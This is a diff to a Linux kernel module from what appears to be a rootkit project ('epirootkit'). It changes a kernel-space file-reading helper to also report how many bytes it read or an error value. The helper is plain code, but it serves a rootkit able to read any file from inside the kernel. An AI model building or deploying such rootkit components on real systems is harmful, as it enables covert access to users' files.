@@ -3,18 +3,11 @@
 #include "epirootkit.h"
 
 // Function prototypes
-char *read_file(char *filename);
+char *read_file(char *filename, int *readed_size);
 int print_file(char *content, enum text_level level);
 
-/**
- * @brief Reads the content of a file into a dynamically allocated buffer.
- *
- * @param filename The name of the file to read.
- * @return char* - Returns a pointer to the buffer containing the file content, or NULL on failure.
- *                 The caller is responsible for freeing the allocated buffer.
- */
-char *read_file(char *filename)
-{
+
+char *read_file(char *filename, int *readed_size){
 	struct file *file = NULL;
 	char *buf = NULL;
 	loff_t pos = 0;
@@ -26,6 +19,7 @@ char *read_file(char *filename)
 	file = filp_open(filename, O_RDONLY, 0);
 	if (IS_ERR(file)) {
 		ERR_MSG("read_file: failed to open file %s\n", filename);
+		*readed_size = -1;
 		return NULL;
 	}
 
@@ -33,6 +27,7 @@ char *read_file(char *filename)
 	buf = kmalloc(buf_size, GFP_KERNEL);
 	if (!buf) {
 		filp_close(file, NULL);
+		*readed_size = -1;
 		return NULL;
 	}
 
@@ -46,6 +41,7 @@ char *read_file(char *filename)
 			if (!new_buf) {
 				kfree(buf);
 				filp_close(file, NULL);
+				*readed_size = -1;
 				return NULL;
 			}
 			buf = new_buf;
@@ -56,11 +52,13 @@ char *read_file(char *filename)
 	if (read_size < 0) {
 		kfree(buf);
 		filp_close(file, NULL);
+		*readed_size = -1;
 		return NULL;
 	}
 
 	buf[total_read] = '\0';
 	filp_close(file, NULL);
+	*readed_size = total_read;
 	return buf;
 }
 
